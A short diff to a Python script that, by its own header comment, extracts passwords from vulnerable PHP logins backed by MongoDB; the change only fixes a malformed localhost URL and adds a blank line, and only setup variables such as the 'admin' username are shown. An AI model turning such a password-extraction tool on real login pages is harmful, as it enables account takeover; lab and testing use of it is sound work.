@@ -1,4 +1,5 @@
 #Script for extracting passwords from vulnerable php logins using mongodb
+
 import requests
 import urllib3
 import string
@@ -8,7 +9,7 @@ import urllib
 username = 'admin'
 password = ''
 method = 'post'
-url = 'http://127.0.01/index.php'
+url = 'http://127.0.0.1/index.php'
 pname = 'password'
 uname = 'username'
 loop = 0
